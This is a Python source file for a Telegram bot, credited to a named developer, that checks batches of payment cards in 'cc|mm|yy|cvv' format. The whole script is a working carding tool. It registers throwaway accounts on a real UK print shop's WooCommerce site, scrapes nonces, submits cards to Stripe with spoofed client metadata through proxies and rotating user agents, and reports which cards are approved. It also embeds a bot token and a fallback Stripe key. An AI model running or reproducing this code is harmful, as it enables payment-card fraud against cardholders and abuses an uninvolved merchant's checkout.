import asyncio
import re
import json
import random
from datetime import datetime
import aiohttp
import uuid
import warnings
from fake_useragent import UserAgent
import requests
import time
import os

warnings.filterwarnings('ignore')

# ============================================
# Configuration - By Mustafa @o8380
# ============================================
BOT_TOKEN = "8744089475:AAHNGB2ZyMeRcWkOwN3GUrdKkqY2t4Dhgb8"
OWNER_ID = 1013384909
OWNER_USERNAME = "o8380"
OWNER_NAME = "Mustafa"

# ============================================
# Helper Functions
# ============================================

def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except (ValueError, AttributeError):
        return None

def generate_random_email():
    import string
    username = ''.join(random.choices(string.ascii_lowercase, k=random.randint(8, 12)))
    number = random.randint(100, 9999)
    domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'protonmail.com']
    return f"{username}{number}@{random.choice(domains)}"

def generate_guid():
    return str(uuid.uuid4())

# ============================================
# Stripe Card Processing
# ============================================

async def process_stripe_card(card_data, proxy_url=None):
    ua = UserAgent()
    site_url = 'https://www.eastlondonprintmakers.co.uk/my-account/add-payment-method/'
    try:
        if not site_url.startswith('http'):
            site_url = 'https://' + site_url
        timeout = aiohttp.ClientTimeout(total=70)
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
            from urllib.parse import urlparse
            parsed = urlparse(site_url)
            domain = f"{parsed.scheme}://{parsed.netloc}"
            email = generate_random_email()
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'user-agent': ua.random
            }
            resp = await session.get(site_url, headers=headers, proxy=proxy_url)
            resp_text = await resp.text()
            register_nonce = (gets(resp_text, 'woocommerce-register-nonce" value="', '"') or 
                             gets(resp_text, 'id="woocommerce-register-nonce" value="', '"') or 
                             gets(resp_text, 'name="woocommerce-register-nonce" value="', '"'))
            if register_nonce:
                username = email.split('@')[0]
                password = f"Pass{random.randint(100000, 999999)}!"
                register_data = {
                    'email': email,
                    'wc_order_attribution_source_type': 'typein',
                    'wc_order_attribution_referrer': '(none)',
                    'wc_order_attribution_utm_campaign': '(none)',
                    'wc_order_attribution_utm_source': '(direct)',
                    'wc_order_attribution_utm_medium': '(none)',
                    'wc_order_attribution_utm_content': '(none)',
                    'wc_order_attribution_utm_id': '(none)',
                    'wc_order_attribution_utm_term': '(none)',
                    'wc_order_attribution_utm_source_platform': '(none)',
                    'wc_order_attribution_utm_creative_format': '(none)',
                    'wc_order_attribution_utm_marketing_tactic': '(none)',
                    'wc_order_attribution_session_entry': site_url,
                    'wc_order_attribution_session_start_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'wc_order_attribution_session_pages': '1',
                    'wc_order_attribution_session_count': '1',
                    'wc_order_attribution_user_agent': headers['user-agent'],
                    'woocommerce-register-nonce': register_nonce,
                    '_wp_http_referer': '/my-account/',
                    'register': 'Register'
                }
                reg_resp = await session.post(site_url, headers=headers, data=register_data, proxy=proxy_url)
                reg_text = await reg_resp.text()
                if 'customer-logout' not in reg_text and 'dashboard' not in reg_text.lower():
                    resp = await session.get(site_url, headers=headers, proxy=proxy_url)
                    resp_text = await resp.text()
                    login_nonce = gets(resp_text, 'woocommerce-login-nonce" value="', '"')
                    if login_nonce:
                        login_data = {
                            'username': username,
                            'password': password,
                            'woocommerce-login-nonce': login_nonce,
                            'login': 'Log in'
                        }
                        await session.post(site_url, headers=headers, data=login_data, proxy=proxy_url)
            add_payment_url = site_url.rstrip('/') + '/add-payment-method/'
            if '/my-account/add-payment-method' not in add_payment_url:
                add_payment_url = f"{domain}/my-account/add-payment-method/"
            headers = {'user-agent': ua.random}
            resp = await session.get(add_payment_url, headers=headers, proxy=proxy_url)
            payment_page_text = await resp.text()
            add_card_nonce = (gets(payment_page_text, 'createAndConfirmSetupIntentNonce":"', '"') or 
                             gets(payment_page_text, 'add_card_nonce":"', '"') or 
                             gets(payment_page_text, 'name="add_payment_method_nonce" value="', '"') or 
                             gets(payment_page_text, 'wc_stripe_add_payment_method_nonce":"', '"'))
            stripe_key = (gets(payment_page_text, '"key":"pk_', '"') or 
                         gets(payment_page_text, 'data-key="pk_', '"') or 
                         gets(payment_page_text, 'stripe_key":"pk_', '"') or 
                         gets(payment_page_text, 'publishable_key":"pk_', '"'))
            if not stripe_key:
                pk_match = re.search(r'pk_live_[a-zA-Z0-9]{24,}', payment_page_text)
                if pk_match:
                    stripe_key = pk_match.group(0)
            if not stripe_key:
                stripe_key = 'pk_live_VkUTgutos6iSUgA9ju6LyT7f00xxE5JjCv'
            elif not stripe_key.startswith('pk_'):
                stripe_key = 'pk_' + stripe_key
            stripe_headers = {
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'user-agent': ua.random
            }
            stripe_data = {
                'type': 'card',
                'card[number]': card_data['number'],
                'card[cvc]': card_data['cvc'],
                'card[exp_month]': card_data['exp_month'],
                'card[exp_year]': card_data['exp_year'],
                'allow_redisplay': 'unspecified',
                'billing_details[address][country]': 'AU',
                'payment_user_agent': 'stripe.js/5e27053bf5; stripe-js-v3/5e27053bf5; payment-element; deferred-intent',
                'referrer': domain,
                'client_attribution_metadata[client_session_id]': generate_guid(),
                'client_attribution_metadata[merchant_integration_source]': 'elements',
                'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
                'client_attribution_metadata[merchant_integration_version]': '2021',
                'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
                'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
                'client_attribution_metadata[elements_session_config_id]': generate_guid(),
                'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
                'guid': generate_guid(),
                'muid': generate_guid(),
                'sid': generate_guid(),
                'key': stripe_key,
                '_stripe_version': '2024-06-20'
            }
            pm_resp = await session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data, proxy=proxy_url)
            pm_json = await pm_resp.json()
            if 'error' in pm_json:
                return False, pm_json['error']['message']
            pm_id = pm_json.get('id')
            if not pm_id:
                return False, 'Failed to create Payment Method'
            confirm_headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': domain,
                'x-requested-with': 'XMLHttpRequest',
                'user-agent': ua.random
            }
            endpoints = [
                {'url': f"{domain}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent", 'data': {'wc-stripe-payment-method': pm_id}},
                {'url': f"{domain}/wp-admin/admin-ajax.php", 'data': {'action': 'wc_stripe_create_and_confirm_setup_intent', 'wc-stripe-payment-method': pm_id}},
                {'url': f"{domain}/?wc-ajax=add_payment_method", 'data': {'wc-stripe-payment-method': pm_id, 'payment_method': 'stripe'}}
            ]
            for endp in endpoints:
                if not add_card_nonce:
                    continue
                if 'add_payment_method' in endp['url']:
                    endp['data']['woocommerce-add-payment-method-nonce'] = add_card_nonce
                else:
                    endp['data']['_ajax_nonce'] = add_card_nonce
                endp['data']['wc-stripe-payment-type'] = 'card'
                try:
                    res = await session.post(endp['url'], data=endp['data'], headers=confirm_headers, proxy=proxy_url)
                    text = await res.text()
                    if 'success' in text:
                        js = json.loads(text)
                        if js.get('success'):
                            status = js.get('data', {}).get('status')
                            return True, f"Approved (Status: {status})"
                        else:
                            error_msg = js.get('data', {}).get('error', {}).get('message', 'Declined')
                            return False, error_msg
                except:
                    continue
            return False, 'Confirmation failed on site'
    except Exception as e:
        return False, f'System Error: {str(e)}'

async def check_card_async(cc, mes, ano, cvv, proxy=None):
    card_data = {'number': cc, 'exp_month': mes, 'exp_year': ano, 'cvc': cvv}
    is_approved, response_msg = await process_stripe_card(card_data, proxy_url=proxy)
    
    if is_approved:
        return f"✅ APPROVED | {response_msg}"
    elif 'insufficient' in response_msg.lower():
        return f"💰 INSUFFICIENT FUNDS | {response_msg}"
    else:
        return f"❌ DECLINED | {response_msg}"

def check_card_sync(card_input):
    try:
        parts = card_input.split('|')
        if len(parts) != 4:
            return "❌ Invalid format. Use: cc|month|year|cvv"
        
        cc, mm, yy, cvv = parts
        if len(yy) == 4:
            yy = yy[2:]
        
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(check_card_async(cc, mm, yy, cvv))
        loop.close()
        return result
    except Exception as e:
        return f"❌ Error: {str(e)}"

# ============================================
# BIN Lookup
# ============================================

def get_bin_info(cc):
    result = {'brand': 'Unknown', 'type': 'Unknown', 'bank': 'Unknown', 'country': 'Unknown', 'flag': '🌍'}
    try:
        response = requests.get(f"https://lookup.binlist.net/{cc[:6]}", headers={'Accept-Version': '3'}, timeout=8)
        if response.status_code == 200:
            data = response.json()
            result['brand'] = data.get('scheme', 'Unknown').upper()
            result['type'] = data.get('type', 'Unknown').upper()
            result['bank'] = data.get('bank', {}).get('name', 'Unknown')
            result['country'] = data.get('country', {}).get('name', 'Unknown')
            flag_map = {'US': '🇺🇸', 'GB': '🇬🇧', 'CA': '🇨🇦', 'AU': '🇦🇺', 'DE': '🇩🇪', 'RU': '🇷🇺', 'AE': '🇦🇪'}
            result['flag'] = flag_map.get(data.get('country', {}).get('alpha2', ''), '🌍')
    except:
        pass
    return result

# ============================================
# Bulk Card Check
# ============================================

def clean_cards(cards):
    cleaned = []
    seen = set()
    current_year = datetime.now().year % 100
    current_month = datetime.now().month
    for card in cards:
        parts = card.split('|')
        if len(parts) == 4:
            try:
                year = int(parts[2][-2:])
                month = int(parts[1])
                if year > current_year or (year == current_year and month >= current_month):
                    if card not in seen:
                        seen.add(card)
                        cleaned.append(card)
            except:
                pass
    return cleaned

def bulk_check_cards(cards, chat_id, message_id):
    total = len(cards)
    approved = 0
    declined = 0
    
    for i, card in enumerate(cards, 1):
        result = check_card_sync(card)
        
        if 'APPROVED' in result:
            approved += 1
        elif 'DECLINED' in result:
            declined += 1
        
        # إرسال تحديث كل 5 بطاقات
        if i % 5 == 0 or i == total:
            msg = f"📁 Checking: {i}/{total}\n✅ Approved: {approved}\n❌ Declined: {declined}"
            try:
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText",
                             json={"chat_id": chat_id, "message_id": message_id, "text": msg})
            except:
                pass
        
        time.sleep(1)
    
    # النتيجة النهائية
    final_msg = f"""✅ Check Completed - By @{OWNER_USERNAME}
━━━━━━━━━━━━━━━━
✅ Approved: {approved}
❌ Declined: {declined}
📁 Total: {total}
━━━━━━━━━━━━━━━━
[⌤] Dev: @{OWNER_USERNAME}"""
    
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                 json={"chat_id": chat_id, "text": final_msg})

# ============================================
# Telegram Bot
# ============================================

print(f"🤖 Bot Started - By {OWNER_NAME} @{OWNER_USERNAME}")
print(f"Token: {BOT_TOKEN[:20]}...")

# مسح webhook
requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook?drop_pending_updates=true")
requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/logOut")

last_id = 0
print("Waiting for messages...")

while True:
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?offset={last_id+1}&timeout=30"
        response = requests.get(url, timeout=35)
        data = response.json()
        
        if data.get("ok") and data.get("result"):
            for update in data["result"]:
                last_id = update["update_id"]
                chat_id = update["message"]["chat"]["id"]
                text = update["message"].get("text", "")
                first_name = update["message"]["chat"].get("first_name", "User")
                
                print(f"Received: {text[:50]}")
                
                # /start command
                if text == "/start":
                    msg = f"""✅ Welcome {first_name} - By @{OWNER_USERNAME}
━━━━━━━━━━━━━━━━
[ϟ] Gateway: Stripe Auth
[ϟ] Developer: @{OWNER_USERNAME}
━━━━━━━━━━━━━━━━
Commands:
/pp [card] - Check single card
Send .txt file - Bulk check
━━━━━━━━━━━━━━━━
Format: cc|mm|yy|cvv
Example: 123456|12|28|123"""
                    
                    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                                 json={"chat_id": chat_id, "text": msg})
                
                # /pp command
                elif text.startswith("/pp"):
                    card = text.replace("/pp", "").strip()
                    if not card:
                        msg = "❌ Usage: /pp 123456|12|28|123"
                    else:
                        msg = check_card_sync(card)
                    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                                 json={"chat_id": chat_id, "text": msg})
                
                # /bin command
                elif text.startswith("/bin"):
                    bin_num = text.replace("/bin", "").strip()
                    if not bin_num or len(bin_num) < 6:
                        msg = "❌ Usage: /bin 123456"
                    else:
                        bin_data = get_bin_info(bin_num[:6])
                        msg = f"""🔍 BIN: {bin_num[:6]} - By @{OWNER_USERNAME}
━━━━━━━━━━━━━━━━
Brand: {bin_data['brand']}
Type: {bin_data['type']}
Bank: {bin_data['bank']}
Country: {bin_data['country']} {bin_data['flag']}"""
                    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                                 json={"chat_id": chat_id, "text": msg})
                
                # /help command
                elif text == "/help":
                    msg = f"""Commands - By @{OWNER_USERNAME}
━━━━━━━━━━━━━━━━
/pp [card] - Check card
/bin [bin] - BIN lookup
Send .txt file - Bulk check
━━━━━━━━━━━━━━━━
Format: 123456|12|28|123"""
                    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                                 json={"chat_id": chat_id, "text": msg})
                
                # Auto detect card
                elif '|' in text and not text.startswith('/'):
                    msg = check_card_sync(text)
                    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                                 json={"chat_id": chat_id, "text": msg})
                
                # Handle file upload
                elif update["message"].get("document"):
                    file_id = update["message"]["document"]["file_id"]
                    file_name = update["message"]["document"].get("file_name", "cards.txt")
                    
                    # تحميل الملف
                    file_info = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getFile?file_id={file_id}").json()
                    file_path = file_info["result"]["file_path"]
                    file_content = requests.get(f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path}").text
                    
                    # استخراج البطاقات
                    cards = []
                    for line in file_content.split('\n'):
                        line = line.strip()
                        if '|' in line:
                            parts = line.split('|')
                            if len(parts) >= 4:
                                cc = parts[0].strip()
                                mm = parts[1].strip().zfill(2)
                                yy = parts[2].strip()
                                cvv = parts[3].strip()
                                if len(yy) == 4:
                                    yy = yy[2:]
                                cards.append(f"{cc}|{mm}|{yy}|{cvv}")
                    
                    if not cards:
                        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                                     json={"chat_id": chat_id, "text": "❌ No valid cards found in file"})
                        continue
                    
                    # تنظيف البطاقات
                    original_count = len(cards)
                    cards = clean_cards(cards)
                    
                    msg = requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                                       json={"chat_id": chat_id, "text": f"📁 Cards found: {original_count}\n🧹 Cleaned: {len(cards)}\n✅ Approved: 0\n❌ Declined: 0\n\n🔄 Starting check..."})
                    
                    msg_id = msg.json()["result"]["message_id"]
                    
                    # بدء الفحص
                    bulk_check_cards(cards, chat_id, msg_id)
                
                else:
                    msg = f"Send /pp or card format: 123456|12|28|123\nDev: @{OWNER_USERNAME}"
                    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                                 json={"chat_id": chat_id, "text": msg})
                    
    except Exception as e:
        print(f"Error: {e}")
        time.sleep(5)
